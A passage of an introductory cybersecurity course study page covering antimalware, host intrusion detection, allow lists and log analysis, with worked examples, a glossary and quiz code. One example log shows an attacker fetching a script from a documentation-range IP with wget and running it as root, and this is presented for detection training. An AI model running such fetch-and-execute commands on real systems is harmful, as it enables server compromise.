+      A hardened system works the same way. When the baseline says exactly what belongs, anything unfamiliar stands out. The village comes back in <a href="#appsec">Concept 11</a> and in the fisherman example under <a href="#examples">Worked examples</a>.
+      <span class="src">Adapted from McCarty, <em>Cyberjutsu</em>, Ch. 3 "Xenophobic Security"</span>
+    </div>
+  </section>
+
+  <!-- ── ANTIMALWARE PROTECTION (9.2) ── -->
+  <section id="antimalware">
+    <div class="section-head">
+      <p class="kicker">Concept 9 · Module 9.2</p>
+      <h2>Antimalware Protection</h2>
+      <p>Endpoints are where users click links and open attachments, which makes them the most common way in. Malware protection has to happen both on the host and on the network in front of it.</p>
+    </div>
+
+    <h3>How host-based antimalware detects malware</h3>
+    <table class="model-table">
+      <thead><tr><th>Method</th><th>How it works</th><th>Weak spot</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Signature-based</td><td>Matches files against a database of known malware "fingerprints"</td><td>Misses new or modified malware it has no signature for</td></tr>
+        <tr><td style="font-weight:700;">Heuristics-based</td><td>Looks for general traits common to malware, like suspicious code patterns</td><td>More false positives</td></tr>
+        <tr><td style="font-weight:700;">Behavior-based</td><td>Watches what a program actually does while it runs, e.g. mass-encrypting files</td><td>The malware has to start running before it's caught</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Network-based malware protection</h3>
+    <table class="model-table">
+      <thead><tr><th>Layer</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Advanced malware protection (AMP)</td><td>Endpoint and network protection that keeps tracking files after they've been let in, so it can flag them later if they turn out to be malicious</td></tr>
+        <tr><td style="font-weight:700;">Email security appliance (ESA)</td><td>Filters spam and malicious attachments and links before they reach an inbox</td></tr>
+        <tr><td style="font-weight:700;">Web security appliance (WSA)</td><td>Filters web traffic and blocks known-bad sites and downloads</td></tr>
+        <tr><td style="font-weight:700;">Network Access Control (NAC)</td><td>Keeps non-compliant devices (unpatched, no antivirus) off the network</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout xref">
+      ESA, WSA, and NAC are the specialized appliances from <a href="IT121_Session04.html#secdevices">Session 4's security devices</a>, now seen as part of malware defense.
+    </div>
+
+    <p>These defenses have become good at catching the tools attackers write themselves. Good enough, in fact, that attackers changed tactics. <a href="#appsec">Concept 11</a> covers what they switched to.</p>
+  </section>
+
+  <!-- ── HOST-BASED INTRUSION PREVENTION (9.3) ── -->
+  <section id="hips">
+    <div class="section-head">
+      <p class="kicker">Concept 10 · Module 9.3</p>
+      <h2>Host-Based Intrusion Prevention</h2>
+      <p>Session 4's IDS and IPS protect the network. The host-based versions run on each endpoint, where they can see things network sensors can't, such as traffic after it's decrypted or a system file being changed.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Tool</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Host-based firewall</td><td>Filters traffic in and out of one machine: Windows Defender Firewall, or <code>iptables</code>/<code>nftables</code> (with front ends like <code>ufw</code> and <code>firewalld</code>) on Linux</td></tr>
+        <tr><td style="font-weight:700;">HIDS (host-based intrusion detection)</td><td>Monitors a host's logs, file integrity, registry or config changes, and running processes, and alerts on anything suspicious. OSSEC is a common open-source example</td></tr>
+        <tr><td style="font-weight:700;">HIPS (host-based intrusion prevention)</td><td>Same visibility as a HIDS, but it can also block the action, not just alert</td></tr>
+      </tbody>
+    </table>
+
+    <h3>How a HIDS decides something is wrong</h3>
+    <table class="model-table">
+      <thead><tr><th>Approach</th><th>Idea</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Anomaly-based</td><td>Learn what normal looks like on this host, then flag deviations from it</td></tr>
+        <tr><td style="font-weight:700;">Policy-based</td><td>Flag anything that breaks a defined rule, e.g. "nothing may modify <code>/etc/passwd</code> except <code>passwd</code>"</td></tr>
+        <tr><td style="font-weight:700;">Signature-based</td><td>Match known attack patterns, the same idea as signature-based antimalware</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- ── APPLICATION SECURITY (9.4) ── -->
+  <section id="appsec">
+    <div class="section-head">
+      <p class="kicker">Concept 11 · Module 9.4</p>
+      <h2>Application Security</h2>
+      <p>Every installed application adds to the <b>attack surface</b>, the total set of points where an attacker could try to get in. Application security shrinks that surface and makes unknown programs safe to examine.</p>
+    </div>
+
+    <table class="model-table">
+      <thead><tr><th>Technique</th><th>How it works</th></tr></thead>
+      <tbody>
+        <tr><td style="font-weight:700;">Block list (blacklist)</td><td>Name what's <em>not</em> allowed to run, and allow everything else. Easy to manage, but anything not on the list gets through</td></tr>
+        <tr><td style="font-weight:700;">Allow list (whitelist)</td><td>Name what <em>is</em> allowed to run, and block everything else. Much stronger, but more work to maintain</td></tr>
+        <tr><td style="font-weight:700;">Sandboxing</td><td>Run a suspicious file in an isolated environment and watch what it does: files touched, registry changes, network calls. Examples include Cuckoo Sandbox, ANY.RUN, and Cisco's Threat Grid</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout">
+      <b>Sandbox reports are how analysts learn what a piece of malware does</b> without risking a real machine. That's the "use malware investigation tools" objective: submit a sample, then read the behavior report. Many public sandboxes publish reports for samples others have already submitted.
+    </div>
+
+    <p>An allow list is the village from <a href="#defending">Concept 8</a> turned into software: only familiar programs get in. That creates a problem for attackers. If the only programs allowed to run are the defender's own, how does an attacker get anything done? They use the defender's own programs.</p>
+
+    <div class="callout analogy">
+      <span class="lbl">Think of it like… the shinobi's everyday tools</span>
+      Shinobi were trained to make tools from ordinary things they could buy or find on the spot, like farm tools and household items. A traveler carrying a sickle raised no suspicion, and a search turned up nothing unusual. Attackers call their version <b>living off the land</b>. Instead of bringing malware that antimalware might catch, they use what's already installed: PowerShell, Task Scheduler, or a web browser on Windows, and <code>wget</code>, <code>bash</code>, or even the SSH client from <a href="#servers">Concept 3</a> on Linux. All of these are on every allow list.<br><br>
+      The <a href="#examples">"Reading auth.log like an analyst"</a> example is exactly this: nothing in that log is malware. Since defenders can't delete their own tools, they limit who can run the powerful ones and log every use, the way <code>sudo</code> records each command.
+      <span class="src">Adapted from McCarty, <em>Cyberjutsu</em>, Ch. 8 "Tools"</span>
+    </div>
+  </section>
+
+  <!-- ── FLASHCARDS ── -->
+  <section id="flashcards">
+    <div class="section-head">
+      <p class="kicker">Study</p>
+      <h2>Flashcards</h2>
+      <p>Click a card to flip it. Double-click to mark it known once you can define it without peeking.</p>
+    </div>
+    <div class="toolbar">
+      <button class="btn" id="shuffleBtn">Shuffle</button>
+      <button class="btn" id="resetKnownBtn">Reset progress</button>
+      <span id="cardProgress"></span>
+    </div>
+    <div class="card-grid" id="cardGrid"></div>
+  </section>
+
+  <!-- ── QUIZ ── -->
+  <section id="quiz">
+    <div class="section-head">
+      <p class="kicker">Check yourself</p>
+      <h2>Sample questions</h2>
+      <p>Same style as the module quizzes. Pick an answer to see whether you're right and why.</p>
+    </div>
+    <div id="quizScore"></div>
+    <div id="quizList"></div>
+    <button class="btn" id="resetQuizBtn">Reset quiz</button>
+  </section>
+
+  <!-- ── EXAMPLES ── -->
+  <section id="examples">
+    <div class="section-head">
+      <p class="kicker">Applied</p>
+      <h2>Worked examples</h2>
+      <p>Real-ish scenarios. Think them through before you expand the answer.</p>
+    </div>
+
+    <div class="example">
+      <span class="tag">Linux logs</span>
+      <h3>Is someone guessing passwords?</h3>
+      <p>A Bastion client reports their Ubuntu web server "feels slow" and they're worried someone is trying to break into it over SSH. You have a shell on the box. Which file do you check, and what one-line command tells you how many failed login attempts there have been?</p>
+      <details class="solution">
+        <summary>Show answer</summary>
+        <div class="solbody">
+          <p><strong>File:</strong> <code>/var/log/auth.log</code> (Ubuntu is Debian-family; on Red Hat it would be <code>/var/log/secure</code>).</p>
+          <p><strong>Command:</strong> <code>grep "Failed password" /var/log/auth.log | wc -l</code>. <code>grep</code> finds the matching lines, and piping them into <code>wc -l</code> counts them. Run <code>tail -f /var/log/auth.log</code> to watch new attempts arrive live.</p>
+        </div>
+      </details>
+    </div>
+
+  <div class="example">
+      <span class="tag">Linux logs</span>
+      <h3>Reading auth.log like an analyst</h3>
+      <p>You pull this excerpt from <code>/var/log/auth.log</code> on a Bastion client's web server. The account <code>deploy</code> is supposed to be used only by an automated deployment script. Which lines are routine, and which would you escalate?</p>
+<pre class="log">Sep 24 02:17:01 web01 CRON[2210]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 24 02:17:01 web01 CRON[2210]: pam_unix(cron:session): session closed for user root
+Sep 24 02:41:09 web01 sshd[2388]: Accepted password for deploy from 203.0.113.45 port 51122 ssh2
+Sep 24 02:42:30 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get install -y nmap
+Sep 24 02:43:02 web01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.7/x.sh
+Sep 24 02:43:15 web01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash x.sh</pre>
+      <details class="solution">
+        <summary>Show answer</summary>
+        <div class="solbody">
+          <p><strong>Routine:</strong> the two <code>CRON</code> lines. Scheduled jobs open and close a root session like this all the time.</p>
+          <p><strong>Escalate everything from 02:41 on.</strong> An account meant for automation logged in <em>interactively</em> (it has a terminal, <code>TTY=pts/0</code>), with a password, at 2:41 a.m. It then used <code>sudo</code> to become root and install a network scanner, downloaded a script into <code>/tmp</code> from an unfamiliar address, and ran it as root. Each step alone might have an explanation. Together they match the pattern of a stolen credential being used to escalate privileges and bring in tools.</p>
+          <p><strong>Useful commands:</strong> <code>grep "COMMAND=" /var/log/auth.log</code> lists every command run through <code>sudo</code>, and <code>grep deploy /var/log/auth.log</code> shows everything that account did. Next, compare the times with the web server's access log. Checking two log sources against each other is called <em>correlation</em>.</p>
+          <p style="font-size:.85rem;color:var(--muted);">Modeled on the Linux log exercise in Diogenes &amp; Ozkaya, <em>Cybersecurity – Attack and Defense Strategies</em>, 3rd ed., Chapter 17. The log lines here are original, and the IP addresses come from ranges reserved for documentation.</p>
+        </div>
+      </details>
+    </div>
+
+    <div class="example">
+      <span class="tag">Servers &amp; clients</span>
+      <h3>The port nobody asked for</h3>
+      <p>On a Linux server that should only run a website, <code>ss -tuln</code> shows listeners on ports 22, 80, 443, and 4444.</p>
+      <details class="solution">
+        <summary>Show answer</summary>
+        <div class="solbody">
+          <p><strong>22</strong> is SSH (normal for admin access), and <strong>80/443</strong> are HTTP/HTTPS (the website). <strong>4444</strong> isn't a standard service. It's a well-known default port for attacker tooling such as reverse shells. Next step: find which process owns it (<code>sudo ss -tulnp</code> or <code>ps</code>) and escalate.</p>
+        </div>
+      </details>
+    </div>
+
+    <div class="example">
+      <span class="tag">Permissions</span>
+      <h3>Read the permission string</h3>
+      <p><code>ls -l</code> shows <code>-rw-r--r-- root root /etc/passwd</code> and <code>-rwxrwxrwx www-data www-data /var/www/upload.sh</code>. What are the octal values, and which one should worry you?</p>
+      <details class="solution">
+        <summary>Show answer</summary>
+        <div class="solbody">
+          <p><strong>/etc/passwd</strong> is <code>644</code>: root can read and write it, everyone else can only read it. That's normal for this file.</p>
+          <p><strong>upload.sh</strong> is <code>777</code>: <em>anyone</em> can modify and run it. Any user or compromised service could rewrite the script to do whatever they want. Tighten it with <code>chmod 750</code> or stricter.</p>
+        </div>
+      </details>
+    </div>
+
+    <div class="example">
+      <span class="tag">Defending systems</span>
+      <h3>The fisherman who doesn't fit</h3>
+      <p>Remember the village from <a href="#defending">Concept 8</a>? <em>Cyberjutsu</em> includes a thought exercise that starts there. A castle's fish supplier speaks with an unfamiliar accent, preserves fish in a way nobody has seen before, and has a surname no one recognizes. He says he just likes the taste. Is he a spy? The book's point is that you have to plan for three possibilities: he <em>is</em> a spy, he <em>isn't</em>, or you <em>can't tell</em>.</p>
+      <p>Here's the network version. A Bastion client's scan turns up a new device named <code>HP-LaserJet-4F</code>. Its network card maker (looked up from its MAC address) is Raspberry Pi, not HP. It's listening on SSH (port 22) and isn't in the asset inventory. What do you do?</p>
+      <details class="solution">
+        <summary>Show answer</summary>
+        <div class="solbody">
+          <p><strong>Check it against the baseline.</strong> It isn't in the inventory, and its hardware doesn't match its name. Printers don't usually run SSH, either. That's the "unfamiliar accent."</p>
+          <p><strong>Verify the story before you act on it.</strong> Ask facilities and IT whether anyone installed a printer or a Raspberry Pi on that floor. A test board left by a staff member is possible, and so is a planted device.</p>
+          <p><strong>Contain it without destroying evidence.</strong> Isolate it by moving it to a quarantine VLAN or blocking it through NAC, instead of just unplugging it. That limits the risk if it <em>is</em> malicious and keeps it intact for investigation if you can't yet tell. Then update the inventory either way.</p>
+          <p style="font-size:.85rem;color:var(--muted);">Adapted from the Castle Theory thought exercise in McCarty, <em>Cyberjutsu</em>, Ch. 3. The network scenario is original.</p>
+        </div>
+      </details>
+    </div>
+
+    <div class="example">
+      <span class="tag">Antimalware</span>
+      <h3>Why didn't antivirus catch it?</h3>
+      <p>A brand-new ransomware strain, never seen before, lands on an endpoint. The signature-based antivirus says the file is clean. Seconds after it runs, the endpoint agent kills it because it started rapidly encrypting files in the user's Documents folder.</p>
+      <details class="solution">
+        <summary>Show answer</summary>
+        <div class="solbody">
+          <p>Signature-based detection can only match malware it already has a fingerprint for, and there wasn't one for a new strain. <strong>Behavior-based</strong> detection caught it by what it did (mass encryption), not by what it looked like. That's why modern endpoint protection layers several detection methods.</p>
+        </div>
+      </details>
+    </div>
+
+    <div class="example">
+      <span class="tag">Application security</span>
+      <h3>Block list or allow list?</h3>
+      <p>Two environments: (A) a point-of-sale terminal that only ever runs the register app, and (B) a developer's workstation where new tools get installed weekly.</p>
+      <details class="solution">
+        <summary>Show answer</summary>
+        <div class="solbody">
+          <p><strong>(A) Allow list.</strong> The set of legitimate programs is tiny and never changes, so blocking everything else costs almost nothing and stops unknown malware outright.</p>
+          <p><strong>(B) Block list</strong> (plus good antimalware). An allow list would need updating constantly and would get in the way of the job. The trade-off is weaker protection against anything not already known to be bad.</p>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ── GOING DEEPER ── -->
+  <section id="deeper">
+    <div class="section-head">
+      <p class="kicker">Optional reading</p>
+      <h2>Going deeper</h2>
+      <p>Not required, and not on the module quiz. These are chapters from practitioner books that go further into this session's topics, for anyone who wants more than the module covers.</p>
+    </div>
+
+    <div class="example">
+      <span class="tag">Concepts 4 &amp; 7 · Logs</span>
+      <h3>Cybersecurity – Attack and Defense Strategies <span style="font-weight:400;color:var(--muted);">(Diogenes &amp; Ozkaya, 3rd ed., 2022)</span></h3>
+      <p><b>Chapter 17, "Log Analysis":</b> reading Linux authentication logs, web server access logs, and firewall logs by hand, and why an investigation almost always depends on correlating several log sources, not just one. <b>Chapter 12, "Active Sensors":</b> intrusion detection and prevention systems and behavior analytics, which extends Concept 10.</p>
+    </div>
+
+    <div class="example">
+      <span class="tag">Concepts 1 &amp; 3 · Linux for monitoring</span>
+      <h3>The Practice of Network Security Monitoring <span style="font-weight:400;color:var(--muted);">(Bejtlich, 2013)</span></h3>
+      <p><b>Chapter 1:</b> the reasoning behind network security monitoring: collect evidence first so you can investigate later. <b>Chapter 6, "Command Line Packet Analysis Tools":</b> tcpdump and related tools, run from the Linux shell. This is what "Linux skills are essential for monitoring" looks like in practice. <em>Heads-up:</em> the book's Security Onion install steps and screenshots are from an older version, but the concepts still apply.</p>
+    </div>
+
+    <div class="example">
+      <span class="tag">Concepts 8 &amp; 11 · Hardening &amp; app control</span>
+      <h3>Cyberjutsu <span style="font-weight:400;color:var(--muted);">(McCarty, 2021)</span></h3>
+      <p>Uses historical ninja (shinobi) tactics to explain modern defense, and it's the source of this session's village, everyday-tools, and fisherman comparisons. <b>Chapter 3, "Xenophobic Security":</b> treat anything unfamiliar as suspect. It argues that a documented baseline configuration and a full system inventory are what let you notice something that doesn't belong. <b>Chapter 8, "Tools":</b> how attackers turn legitimate tools against you ("living off the land"), and why restricting risky built-in tools belongs next to allow and block lists.</p>
+    </div>
+
+    <div class="example">
+      <span class="tag">Concept 9 · Malware installation</span>
+      <h3>Cyber Security Kill Chain – Tactics and Strategies <span style="font-weight:400;color:var(--muted);">(Nagar &amp; Kumar, 2025)</span></h3>
+      <p><b>Chapter 6, "Installation":</b> how droppers get malware onto an endpoint and set up persistence, and the endpoint defenses aimed at that stage, with ransomware case studies. It connects this session's antimalware content to the kill chain from Session 1.</p>
+    </div>
+  </section>
+
+  <!-- ── GLOSSARY ── -->
+  <section id="glossary">
+    <div class="section-head">
+      <p class="kicker">Reference</p>
+      <h2>Glossary &amp; index</h2>
+      <p>Every term from this session, searchable and indexed A–Z.</p>
+    </div>
+    <input type="text" id="glossarySearch" placeholder="Search terms…" aria-label="Search glossary">
+    <div class="alpha-nav" id="alphaNav"></div>
+    <dl class="glossary" id="glossaryList"></dl>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>IT121 · Cybersecurity Essentials · Session 5 reference — more sessions added as the course progresses.</p>
+  </div>
+</footer>
+
+<button id="backToTop" class="back-to-top" aria-label="Back to top" title="Back to top">↑</button>
+
+<script>
+
+  const TERMS = [
+      {
+          "t": "Allow list (whitelist)",
+          "d": "A list of applications explicitly permitted to run; everything not on it is blocked. Stronger than a block list but more work to maintain."
+      },
+      {
+          "t": "Anomaly-based detection",
+          "d": "Detection that learns a baseline of normal activity on a host or network and flags deviations from it."
+      },
+      {
+          "t": "Asset inventory",
+          "d": "A complete list of every system, device, and piece of software an organization owns — you cannot protect or notice what you have not listed."
+      },
+      {
+          "t": "Attack surface",
+          "d": "The total set of points where an attacker could try to get into a system — every open port, service, and installed application adds to it."
+      },
+      {
+          "t": "auth.log / secure",
+          "d": "The Linux authentication log — /var/log/auth.log on Debian/Ubuntu, /var/log/secure on Red Hat-family distros — recording logins, failed passwords, and sudo use."
+      },
+      {
+          "t": "Baseline configuration",
+          "d": "A documented record of how a system is supposed to be set up, used to spot changes and anything that does not belong."
+      },
+      {
+          "t": "Behavior-based detection",
+          "d": "Antimalware detection that watches what a program does while running (e.g. mass-encrypting files) rather than what its code looks like."
+      },
+      {
+          "t": "Block list (blacklist)",
+          "d": "A list of applications that are forbidden to run; everything else is allowed. Easy to manage, but anything not listed gets through."
+      },
+      {
+          "t": "Boot integrity",
+          "d": "Ensuring only trusted, signed code loads during startup — e.g. UEFI Secure Boot — so malware can't load before the OS's own defenses."
+      },
+      {
+          "t": "chkrootkit",
+          "d": "A Linux tool that scans a host for signs of known rootkits."
+      },
+      {
+          "t": "chmod / chown",
+          "d": "Linux commands to change a file's permissions (chmod 750 file) and its owner/group (chown user:group file)."
+      },
+      {
+          "t": "Correlation",
+          "d": "Comparing events from two or more log sources (e.g. auth.log and a web server log) by time and detail to reconstruct what happened."
+      },
+      {
+          "t": "Desktop environment",
+          "d": "The full Linux graphical package — window manager, panels, menus, file manager, settings — e.g. GNOME, KDE Plasma, Xfce."
+      },
+      {
+          "t": "Distribution (distro)",
+          "d": "The Linux kernel packaged with tools, a package manager, and usually a desktop — e.g. Ubuntu, Fedora, Kali, Security Onion."
+      },
+      {
+          "t": "ext4",
+          "d": "The current default Linux file system on many distributions; a journaling successor to ext2 and ext3."
+      },
+      {
+          "t": "Fork",
+          "d": "How Linux creates a new process: an existing process makes a copy of itself, so every process has a parent."
+      },
+      {
+          "t": "grep",
+          "d": "A Linux command that searches text for lines matching a pattern — the analyst's workhorse for log searching."
+      },
+      {
+          "t": "Hard link",
+          "d": "A second directory entry pointing to the same data on disk as an existing file; it keeps working even if the original name is deleted."
+      },
+      {
+          "t": "Heuristics-based detection",
+          "d": "Antimalware detection that looks for general traits common to malware, catching some unknown variants at the cost of more false positives."
+      },
+      {
+          "t": "HIDS (Host-based Intrusion Detection System)",
+          "d": "Software on an endpoint that monitors its logs, file integrity, configuration, and processes, and alerts on suspicious activity. OSSEC is a common open-source example."
+      },
+      {
+          "t": "HIPS (Host-based Intrusion Prevention System)",
+          "d": "Like a HIDS, but able to block the suspicious action on the host, not just alert on it."
+      },
+      {
+          "t": "Host-based firewall",
+          "d": "A firewall running on an individual machine, filtering its own inbound and outbound traffic — e.g. Windows Defender Firewall, or iptables/nftables on Linux."
+      },
+      {
+          "t": "Kali Linux",
+          "d": "A Linux distribution built for penetration testing, preloaded with offensive security tools."
+      },
+      {
+          "t": "Linux",
+          "d": "An open-source operating system kernel, the base of distributions that run most servers and most security tooling."
+      },
+      {
+          "t": "Living off the land",
+          "d": "An attacker technique of using legitimate tools already present on a system (PowerShell, wget, Task Scheduler) instead of custom malware, to avoid detection."
+      },
+      {
+          "t": "Log directory (/var/log)",
+          "d": "The standard Linux directory holding system and service log files."
+      },
+      {
+          "t": "Mount",
+          "d": "Attaching a drive, partition, or network share into the single Linux directory tree at a chosen directory."
+      },
+      {
+          "t": "netstat / ss",
+          "d": "Commands that list network connections and listening ports; ss is the modern replacement for netstat on most current Linux distros."
+      },
+      {
+          "t": "Package manager",
+          "d": "The tool a Linux distro uses to install, update, and remove software from trusted repositories — apt, dnf/yum, pacman."
+      },
+      {
+          "t": "Patch management",
+          "d": "A planned process for testing and deploying software updates across every system in an organization."
+      },
+      {
+          "t": "Permissions (rwx)",
+          "d": "Linux read/write/execute rights for a file's owner, group, and others; written in octal as r=4, w=2, x=1 summed per set (e.g. 750)."
+      },
+      {
+          "t": "Piping",
+          "d": "Sending one command's output into another command's input with the | symbol — e.g. ps aux | grep ssh."
+      },
+      {
+          "t": "Policy-based detection",
+          "d": "Detection that flags any action violating a defined rule, regardless of whether it matches a known attack."
+      },
+      {
+          "t": "ps / top / kill",
+          "d": "Linux process tools: ps lists processes, top shows them live, kill stops one by its process ID (PID)."
+      },
+      {
+          "t": "Root",
+          "d": "The Linux superuser account with unrestricted access to the system."
+      },
+      {
+          "t": "Rootkit",
+          "d": "Malware that hides itself — and often other malware — by modifying the operating system, so normal tools don't reveal it."
+      },
+      {
+          "t": "Sandboxing",
+          "d": "Running a suspicious file in an isolated environment to observe its behavior safely — e.g. Cuckoo Sandbox, ANY.RUN, Cisco Threat Grid."
+      },
+      {
+          "t": "Secure Boot",
+          "d": "A UEFI feature that only loads a digitally signed, trusted bootloader and OS, blocking bootkits."
+      },
+      {
+          "t": "Security Onion",
+          "d": "A Linux distribution built for network security monitoring, bundling IDS, packet capture, and log analysis tools."
+      },
+      {
+          "t": "Shell",
+          "d": "The Linux command interpreter (e.g. bash, zsh) that reads typed commands and runs them."
+      },
+      {
+          "t": "Signature-based detection",
+          "d": "Detection that matches files or traffic against a database of known-malicious fingerprints; misses anything new."
+      },
+      {
+          "t": "sudo",
+          "d": "Runs a single command with root privileges, and logs that it was used."
+      },
+      {
+          "t": "Symbolic link",
+          "d": "A shortcut file that points to another path (ln -s); it breaks if the target is moved or deleted."
+      },
+      {
+          "t": "tail -f",
+          "d": "Prints new lines of a file as they're written — used to watch a log live."
+      },
+      {
+          "t": "Terminal emulator",
+          "d": "A window that provides access to the shell inside a graphical desktop."
+      },
+      {
+          "t": "Window manager",
+          "d": "The part of a Linux GUI that controls window placement, appearance, and movement."
+      },
+      {
+          "t": "X Window System (X11)",
+          "d": "The long-standing Linux display server that draws the GUI and handles input; Wayland is its modern successor."
+      }
+  ];
+
+  const QUIZ = [
+      {
+          "q": "Why are Linux skills essential for a SOC analyst?",
+          "choices": [
+              "Linux is the only OS malware can't infect",
+              "Most servers and most security tools (IDS, SIEM, packet capture) run on Linux",
+              "Windows cannot be monitored remotely",
+              "Linux has no command line, so it's easier to learn"
+          ],
+          "correct": 1,
+          "explain": "Linux runs a large share of servers and nearly all security tooling — Security Onion, Kali, tcpdump, and more — so analysts work in it constantly."
+      },
+      {
+          "q": "Which command searches a file for lines matching a pattern?",
+          "choices": [
+              "cat",
+              "grep",
+              "chmod",
+              "mount"
+          ],
+          "correct": 1,
+          "explain": "grep searches text for a pattern — e.g. grep \"Failed password\" /var/log/auth.log."
+      },
+      {
+          "q": "An analyst wants to see which ports a Linux server is listening on. Which command answers that?",
+          "choices": [
+              "ss -tuln",
+              "ls -l",
+              "chown",
+              "tail -f"
+          ],
+          "correct": 0,
+          "explain": "ss -tuln (or the older netstat -tuln) lists listening TCP and UDP ports."
+      },
+      {
+          "q": "Which well-known port does SSH use?",
+          "choices": [
+              "21",
+              "22",
+              "23",
+              "25"
+          ],
+          "correct": 1,
+          "explain": "SSH is TCP 22. 21 is FTP, 23 is Telnet, 25 is SMTP."
+      },
+      {
+          "q": "On an Ubuntu server, where are failed SSH login attempts recorded?",
+          "choices": [
+              "/var/log/auth.log",
+              "/etc/passwd",
+              "/var/log/kern.log",
+              "/home/root/logins"
+          ],
+          "correct": 0,
+          "explain": "Debian/Ubuntu write authentication events to /var/log/auth.log (Red Hat-family distros use /var/log/secure)."
+      },
+      {
+          "q": "Which command lets you watch new lines appear in a log file in real time?",
+          "choices": [
+              "cat",
+              "less",
+              "tail -f",
+              "man"
+          ],
+          "correct": 2,
+          "explain": "tail -f follows a file, printing new lines as they're written."
+      },
+      {
+          "q": "A file's permissions are -rwxr-x---. What is the octal value?",
+          "choices": [
+              "755",
+              "750",
+              "740",
+              "700"
+          ],
+          "correct": 1,
+          "explain": "Owner rwx = 4+2+1 = 7, group r-x = 4+0+1 = 5, others --- = 0, giving 750."
+      },
+      {
+          "q": "What happens to a symbolic link if the file it points to is deleted?",
+          "choices": [
+              "It keeps the file's data",
+              "It becomes a hard link",
+              "It breaks — it points to a path that no longer exists",
+              "It deletes itself automatically"
+          ],
+          "correct": 2,
+          "explain": "A symbolic link just stores a path; with the target gone, it's a broken link. A hard link, by contrast, keeps the data reachable."
+      },
+      {
+          "q": "Which Linux GUI component controls where windows are placed and how they move?",
+          "choices": [
+              "Kernel",
+              "Window manager",
+              "Package manager",
+              "Shell"
+          ],
+          "correct": 1,
+          "explain": "The window manager handles window placement and appearance; the desktop environment bundles it with panels, menus, and apps."
+      },
+      {
+          "q": "What is a rootkit's defining characteristic?",
+          "choices": [
+              "It encrypts files and demands ransom",
+              "It hides itself by modifying the operating system",
+              "It spreads only by email",
+              "It only runs on Windows"
+          ],
+          "correct": 1,
+          "explain": "A rootkit conceals itself (and often other malware) by tampering with the OS — which is why tools like chkrootkit look for signs of tampering."
+      },
+      {
+          "q": "Brand-new malware with no known fingerprint is caught because it starts rapidly encrypting files. Which detection method caught it?",
+          "choices": [
+              "Signature-based",
+              "Behavior-based",
+              "Block list",
+              "NAC"
+          ],
+          "correct": 1,
+          "explain": "Behavior-based detection judges a program by what it does while running, so it can catch malware no signature exists for."
+      },
+      {
+          "q": "Which UEFI feature prevents an unsigned bootloader or bootkit from loading at startup?",
+          "choices": [
+              "BitLocker",
+              "Secure Boot",
+              "UAC",
+              "Patch management"
+          ],
+          "correct": 1,
+          "explain": "Secure Boot only loads signed, trusted boot components — a boot integrity control."
+      },
+      {
+          "q": "How does a HIPS differ from a HIDS?",
+          "choices": [
+              "A HIPS runs on the network, a HIDS on the host",
+              "A HIPS can block suspicious host activity; a HIDS only alerts",
+              "A HIDS uses signatures, a HIPS never does",
+              "There is no difference"
+          ],
+          "correct": 1,
+          "explain": "Both run on the host with the same visibility; prevention (HIPS) can stop the action, detection (HIDS) only reports it."
+      },
+      {
+          "q": "A point-of-sale terminal should only ever run one register application. Which application control is the best fit?",
+          "choices": [
+              "Block list",
+              "Allow list",
+              "No control — antivirus is enough",
+              "Sandboxing every transaction"
+          ],
+          "correct": 1,
+          "explain": "With a tiny, fixed set of legitimate programs, an allow list blocks everything else — including unknown malware — at almost no management cost."
+      },
+      {
+          "q": "An analyst wants to learn what a suspicious attachment does without running it on a real machine. What should they use?",
+          "choices": [
+              "A sandbox",
+              "chmod",
+              "A block list",
+              "NTP"
+          ],
+          "correct": 0,
+          "explain": "A sandbox runs the sample in isolation and reports its behavior — the core malware investigation tool for this module."
+      }
+  ];
+
+  const grid = document.getElementById('cardGrid');
+  TERMS.forEach((item, i) => {
+    const card = document.createElement('button');
+    card.className = 'flashcard';
+    card.setAttribute('aria-label', 'Flashcard: ' + item.t + '. Press to flip.');
+    card.dataset.i = i;
+    card.innerHTML = `
+      <div class="flashcard-inner">
+        <div class="flashcard-face front"><div class="lbl">Term</div><div class="term">${item.t}</div></div>
+        <div class="flashcard-face back"><div class="lbl">Definition</div><div class="def">${item.d}</div></div>
+      </div>`;
+    card.addEventListener('click', () => card.classList.toggle('flipped'));
+    card.addEventListener('dblclick', () => { card.classList.toggle('known'); updateProgress(); });
+    grid.appendChild(card);
+  });
+  function updateProgress(){
+    const known = document.querySelectorAll('.flashcard.known').length;
+    document.getElementById('cardProgress').textContent = `${known} / ${TERMS.length} marked known (double-click a card to mark it)`;
+  }
+  updateProgress();
+  document.getElementById('shuffleBtn').addEventListener('click', () => {
+    const cards = Array.from(grid.children);
+    cards.sort(() => Math.random() - 0.5);
+    cards.forEach(c => { c.classList.remove('flipped'); grid.appendChild(c); });
+  });
+  document.getElementById('resetKnownBtn').addEventListener('click', () => {
+    document.querySelectorAll('.flashcard.known').forEach(c => c.classList.remove('known'));
+    updateProgress();
+  });
+
+  const quizList = document.getElementById('quizList');
+  let score = 0, answered = 0;
+  function renderQuiz(){
+    quizList.innerHTML = ''; score = 0; answered = 0;
+    QUIZ.forEach((item, qi) => {
+      const box = document.createElement('div');
+      box.className = 'quiz-q';
+      box.innerHTML = `<p class="qtext"><span class="qnum">Q${qi+1}.</span>${item.q}</p><div class="choices"></div><p class="explain"></p>`;
+      const choicesEl = box.querySelector('.choices');
+      item.choices.forEach((c, ci) => {
+        const b = document.createElement('button');
+        b.className = 'choice'; b.textContent = c;
+        b.addEventListener('click', () => {
+          if (box.dataset.done) return;
+          box.dataset.done = '1'; answered++;
+          if (ci === item.correct) score++;
